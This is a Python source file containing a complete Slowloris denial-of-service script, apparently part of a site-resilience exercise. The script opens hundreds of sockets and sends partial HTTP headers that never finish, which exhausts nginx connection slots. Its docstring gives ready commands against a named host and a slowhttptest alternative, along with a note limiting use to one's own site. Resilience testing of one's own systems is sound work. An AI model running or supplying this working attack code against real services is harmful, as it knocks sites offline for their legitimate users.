#!/usr/bin/env python3
"""Attack #2 — Slowloris (slow-HTTP connection exhaustion).

Opens many sockets and dribbles partial HTTP headers to hold them open, starving
nginx/worker connection slots so real users get timeouts / 503s.

Run from YOUR laptop or Kali (NOT the server):
    python3 attacks/slowloris.py shopsmart-aisre.duckdns.org -p 443 --https -s 400

On Kali you can instead use the packaged tool:
    slowhttptest -c 500 -H -i 10 -r 200 -u https://shopsmart-aisre.duckdns.org -x 24

Watch (Engineer view): site latency climbs, a site_slow then site_down incident
opens; the Doctor restarts nginx to free the workers and the site recovers.
SAFETY: your own site only. Ctrl-C to stop.
"""
import argparse, random, socket, ssl, sys, time

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("-p", "--port", type=int, default=80)
    ap.add_argument("--https", action="store_true")
    ap.add_argument("-s", "--sockets", type=int, default=300)
    args = ap.parse_args()

    ua = "Mozilla/5.0 (resilience-test; own-site)"
    socks = []

    def new_sock():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        if args.https:
            s = ssl.create_default_context().wrap_socket(s, server_hostname=args.host)
        s.connect((args.host, args.port))
        s.send(f"GET /?{random.randint(0,99999)} HTTP/1.1\r\n".encode())
        s.send(f"Host: {args.host}\r\n".encode())
        s.send(f"User-Agent: {ua}\r\n".encode())
        s.send(b"Accept-language: en-US,en;q=0.5\r\n")
        return s

    print(f"[*] opening {args.sockets} slow connections to {args.host}:{args.port}")
    for _ in range(args.sockets):
        try: socks.append(new_sock())
        except socket.error: break
    print(f"[*] {len(socks)} sockets up. Dribbling headers. Ctrl-C to stop.")

    try:
        while True:
            print(f"[*] keeping {len(socks)} sockets alive…")
            for s in list(socks):
                try:
                    s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())  # never finish the request
                except socket.error:
                    socks.remove(s)
            # top back up
            for _ in range(args.sockets - len(socks)):
                try: socks.append(new_sock())
                except socket.error: break
            time.sleep(10)
    except KeyboardInterrupt:
        print("\n[*] stopping, closing sockets.")
        for s in socks:
            try: s.close()
            except socket.error: pass

if __name__ == "__main__":
    main()
